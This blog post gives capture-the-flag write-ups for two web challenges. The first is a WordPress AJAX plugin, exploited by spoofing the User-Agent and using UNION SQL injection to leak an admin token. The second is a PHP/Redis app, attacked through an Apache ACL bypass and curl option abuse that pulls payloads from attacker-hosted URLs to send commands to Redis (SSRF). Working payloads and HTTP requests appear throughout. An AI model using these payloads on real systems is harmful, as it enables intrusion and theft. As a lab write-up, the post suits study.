---
title: "ReunionCTF 2026 Writeups"
description: This blog post contains writeups for PHP-Redis (SSRF) and AJAX Amsterdam (Broken Access Control)
date: 2026-01-17T20:03:21-05:00
image: 
tags:
    - Ctf
categories:
    - ctf-writeups
comments: false
---

## AJAX Amsterdam
1. These endpoints exist in the Plugin file
```php
add_action('wp_ajax_nopriv_aaf_load_data', 'aaf_remote_loader');
add_action('wp_ajax_aaf_load_data', 'aaf_remote_loader');
add_action('wp_ajax_nopriv_aaf_sys_maintenance', 'aaf_maintenance_mode');
add_action('wp_ajax_aaf_sys_maintenance', 'aaf_maintenance_mode');
```
2. According to this [writeup](https://sec.stealthcopter.com/nahamcon-ctf-2024-my-shop-disaster/), these types of hooks can be accessed via `/wp-admin/admin-ajax.php`
```
wp_ajax_${action},wp_ajax_nopriv_${action} => Access using /wp-admin/admin-ajax.php?action=${action}
```
3. Let's access the Ajax endpoint
```http
GET /wp-admin/admin-ajax.php?action=aaf_load_data HTTP/1.1
```
Output:
```json
{"error":"Access Denied. Fake fan detected."}
```
4. We can see that a simple WAF is present in `ajax-amsterdam.php`
```php
    if (!isset($_SERVER['HTTP_USER_AGENT']) || $_SERVER['HTTP_USER_AGENT'] !== 'F-Side') {
        header("HTTP/1.1 403 Forbidden");
        echo json_encode(array("error" => "Access Denied. Fake fan detected."));
        wp_die();
    }
```
We can easily bypass it with `User-Agent: F-Side`
5. There is a SQL Injection Vulnerability in `ajax-amsterdam.php`
```php
    $rid = $_GET['rid']; 

    $query = "SELECT player_name, critique FROM $table_name WHERE id = " . $rid; // sql injection
    
    $data = $wpdb->get_row($query);
```
6. It is vulnerable to UNION injection attacks.
7. The [options](https://developer.wordpress.org/apis/options/) API stores information in [WP_OPTIONS](https://codex.wordpress.org/Database_Description) table. I am unable to search by string comparison for some reason, so I just enumerate based on id
```http
GET /wp-admin/admin-ajax.php?action=aaf_load_data&rid=-1+UNION+SELECT+option_name,option_value+FROM+wp_options+WHERE+option_id=161 HTTP/1.1
User-Agent: F-Side
```
Output:
```json
{"player":"aaf_admin_token","review":"0368639a6cca2619fb8d5219b081768e"}
```
From the Author: Alternative payloads
> for 7. you can't use strings in your injection because of wordpress magic quotes; code that gets executed by ajax hooks will use magic quotes, so quotes will be escaped
```sql
union select option_name,option_value wp_options where option_name=0x6161665f61646d696e5f746f6b656e
```
8. Then, we submit the token to the `aaf_sys_maintenance` endpoint
```php
add_action('wp_ajax_nopriv_aaf_sys_maintenance', 'aaf_maintenance_mode');


function aaf_maintenance_mode() {
    // SNIP

    $input_token = isset($_POST['auth_token']) ? $_POST['auth_token'] : '';
    $real_token = get_option('aaf_admin_token');

    if ($input_token === $real_token) {
        $response = array(
            "status" => "success",
            "action" => "System Unlocked. F-Side controls the narrative.",
            "flag" => "RE:CTF{dontsubmitthisflagplease}"
        );
        echo json_encode($response);
    }
    // SNIP
}
```
Output:
```JSON
{"status":"success","action":"System Unlocked. F-Side controls the narrative.","flag":"RE:CTF{ezchainingunauthsqli2bac_oleeoleee}"}
```
## PHP-Redis
1. In `/config/apache2.conf`, we see this configuration
```xml
<VirtualHost *:80>
	 <SNIP>
    <Files "admin.php">
        AuthType Basic 
        AuthName "Admin Panel - Restricted Access"
        AuthUserFile "/etc/apache2/.htpasswd"
        Require valid-user
    </Files>

    <FilesMatch ".+\.php$">
        SetHandler "proxy:fcgi://php-fpm:9000"
        SetEnvIf Request_URI ".*" SCRIPT_FILENAME=/var/www/html$0
    </FilesMatch>
    <SNIP>
</VirtualHost>
```
- It means `apache2` server is matching for strictly 'admin.php'
I also noticed that an old version of Ubuntu is being used
```dockerfile
FROM ubuntu:18.04
```
2. It is vulnerable to this [ACL Bypass](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/#%E2%9A%94%EF%B8%8F-Primitive-1-2-ACL-Bypass)
```http
GET /admin.php%3Fooo.php HTTP/1.1
```
- It is does not match `admin.php`, but `"proxy:fcgi://php-fpm:9000"` will interpret it as `/admin.php?ooo.php`
Output:
```http
HTTP/1.1 200 OK
<SNIP>
TechCorp Network Monitor - Admin Dashboard
```
3. There is a command injection vulnerability in `admin.php`
```php
$command = 'cd /tmp && timeout 5 curl --max-time 3 ' . implode(' ', $cmd_parts) . ' 2>&1';
exec($command, $result, $exit_code); // command Injection
```
- Maybe it is not possible due to the presence of `escapeshellarg`
It accepts 4 parameters
```php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'ping') {
    header('Content-Type: application/json');
    
    $endpoint = $_POST['url'] ?? '';
    $param = $_POST['opt'] ?? '';
    $param_value = $_POST['data'] ?? '';
    $using_config = ($param === '-K' && $param_value);
    // ...
    
    if ($param && $param_value && is_string($param) && is_string($param_value)) {
        if (!preg_match('/^-[A-Za-z]$/', $param)) {
            echo json_encode(['success' => false, 'message' => 'Invalid option']);
            exit;
        }

        if ($param === '-K') { // curl based on config file
            $cmd_parts[] = '-K';
            $cmd_parts[] = escapeshellarg($param_value);
        }
        else if ($param === '-T') { // upload files
            $cmd_parts[] = '-T';
            $cmd_parts[] = escapeshellarg($param_value);
        }
        else if ($param === '-o' && in_array($param_value, ['GET', 'POST'])) { // output files
            $unique_id = bin2hex(random_bytes(8));
            $file_path = $param_value . '_' . $unique_id;
            $cmd_parts[] = '-o';
            $cmd_parts[] = escapeshellarg($file_path);
            $saved_file = $file_path;
        }
        else if ($param === '-d' || in_array($param_value, ['GET', 'POST'])) { // send POST data
            $cmd_parts[] = $param;
            $cmd_parts[] = escapeshellarg($param_value);
        }
    }
```
- Cool, the config file should enable us to bypass the WAF in front
4. Let's upload a file
First, I created an endpoint that returns a file like this
```
url=gopher://127.0.0.1:6379/_CONFIG%20GET%20maxmemory
```
To upload a file,
```http
POST /admin.php%3Fooo.php HTTP/1.1
url=https://webhook.site/4faf52c5-2b13-4f10-abf8-7ec4b2f6ebc1&opt=-o&data=GET&action=ping
```
Output:
```json
{"success":true,"message":"Endpoint is reachable - Saved to: GET_2dbb0f46ffb56cea","output":"  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100    53    0    53    0     0    100      0 --:--:-- --:--:-- --:--:--   100","filename":"GET_2dbb0f46ffb56cea"}
```
5. When I try to interact with the Redis server via Gopher,
```http
POST /admin.php%3Fooo.php HTTP/1.1
url=%20&opt=-K&data=GET_2dbb0f46ffb56cea&action=ping
```
I got this:
```json
{"success":false,"message":"Endpoint is unreachable","output":"curl: (3) URL using bad\/illegal format or missing URL\ncurl: (1) Protocol \"gopher\" not supported or disabled in libcurl"}
```
It is due to this config in Dockerfile
```dockerfile
&& cd curl-7.88.1 \
&& ./configure \
	--prefix=/usr/local \
	--enable-optimize \
	--disable-manual \
	--disable-file \
	--disable-gopher \
	--with-openssl \
	--with-zlib \
&& make -j$(nproc) \
```
6. After reading a bit of documentation, I realised that it is possible to perform redis SSRF without the gopher protocol.
```
curl http://172.22.0.3:6379/ -X PING -H User-Agent: -H Host: -H Accept: -T redis-command --http0.9
```
Output:
```
-ERR wrong number of arguments for 'ping' command
-ERR unknown command 'Content-Length:', with args beginning with: '5' 
+PONG
```
7. I noticed that the current redis database does not contain the info we want. It was saved and the process is killed.
```sh
redis-server /usr/local/etc/redis/redis.conf &
REDIS_PID=$!
redis-cli SAVE
kill $REDIS_PID
```
And when I tried to run `CONFIG`, turns out it is already blacklisted.
```sh
cat > /tmp/redis-protected.conf << 'EOF'
protected-mode no
bind 0.0.0.0
port 6379
rename-command DEL ""
rename-command UNLINK ""
rename-command FLUSHDB ""
rename-command FLUSHALL ""
rename-command SET ""
rename-command SETEX ""
rename-command SETNX ""
rename-command SETRANGE ""
rename-command MSET ""
rename-command MSETNX ""
rename-command GETSET ""
rename-command APPEND ""
rename-command RENAME ""
rename-command RENAMENX ""
rename-command MOVE ""
rename-command EXPIRE ""
rename-command EXPIREAT ""
rename-command PEXPIRE ""
rename-command PEXPIREAT ""
rename-command RESTORE ""
rename-command MIGRATE ""
rename-command CONFIG ""
rename-command SHUTDOWN ""
EOF
exec redis-server /tmp/redis-protected.conf
```
But somehow, I am still able to retrieve the flag variable in the database. Gotta research more
```
172.22.0.3:6379> keys *
1) "app_version"
2) "last_update"
3) "flag"
172.22.0.3:6379> GET flag
"RE:CTF{fake_flag}"
```
7. A simple POC to get flag from the redis server without gopher
```
echo "GET flag" > redis-command
cat << EOF > config
url=http://172.22.0.3:6379/
-X PING
-H User-Agent:
-H Host:
-H Accept:
-T redis-command
--http0.9
EOF
# Im proud of the command on top :) 100% homemade
curl -K config     
```
Output:
```              
-ERR wrong number of arguments for 'ping' command
-ERR unknown command 'Content-Length:', with args beginning with: '9' 
$17
RE:CTF{fake_flag}
```
- Cool
8. Gameplan:
New redis_command
```
GET flag
```
First, upload `redis_command` file onto the server using the POST request above.
```
redis_command=>GET_99012fe8c21cdb44
```
New config file
```
-X PING
-H User-Agent:
-H Host:
-H Accept:
-T GET_99012fe8c21cdb44
--http0.9
```
Then, upload the config file
```
config=>GET_ff980ff9116d9ec7
```
Then, we curl the Redis Server using the config file
```
POST /admin.php%3Fooo.php HTTP/1.1
url=%20&opt=-K&data=GET_ff980ff9116d9ec7&action=ping
```
Output:
```json
{"success":false,"message":"Endpoint is unreachable","output":"curl: (3) URL using bad\/illegal format or missing URL"}
```
9. I realised that the redis server is not in the same machine as PHP_FPM. I also think that the new line is important. It seems like webhook is removing them.
10. Let's host our own server instead
New redis_command
```
GET flag
```
First, upload the `redis_command` file onto the server using the POST request below
```
POST /admin.php%3Fooo.php HTTP/1.1
url=http://0.tcp.ap.ngrok.io:12286/redis-command&opt=-o&data=GET&action=ping
```
Output:
```
redis_command=>GET_e7326181518a0e04
```
New config file
```
cat << EOF > config
url=http://redis:6379/
-X PING
-H User-Agent:
-H Host:
-H Accept:
-T GET_e7326181518a0e04
--http0.9

EOF
```
Then, upload the config file
```
POST /admin.php%3Fooo.php HTTP/1.1
url=http://0.tcp.ap.ngrok.io:12286/config&opt=-o&data=GET&action=ping
```
Output:
```
config=>GET_fa3dbc9bd61758ed
```
Then, we curl the Redis Server using the config file
```http
POST /admin.php%3Fooo.php HTTP/1.1
url=http://redis:6379/&opt=-K&data=GET_fa3dbc9bd61758ed&action=ping
```
Output:
```
{"success":false,"message":"Endpoint is unreachable","output":"  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r 95   207    0   198    0     0    197      0 --:--:--  0:00:01 --:--:--   197\r100   263    0   254  100     9    126      4  0:00:02  0:00:02 --:--:--   131\r100   263    0   254  100     9     84      2  0:00:04  0:00:03  0:00:01    87\ncurl: (28) Operation timed out after 3002 milliseconds with 254 bytes received\n-ERR wrong number of arguments for 'ping' command\n-ERR unknown command 'Content-Length:', with args beginning with: '9'\n-ERR unknown command 'Expect:', with args beginning with: '100-continue'\n$49\nRE:CTF{0r4ng3_1z_my_g04t_plu5_u_d0nt_n33d_g0ph3r}\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current"}
```
11. Notes to self: dict and telnet protocol can be used too.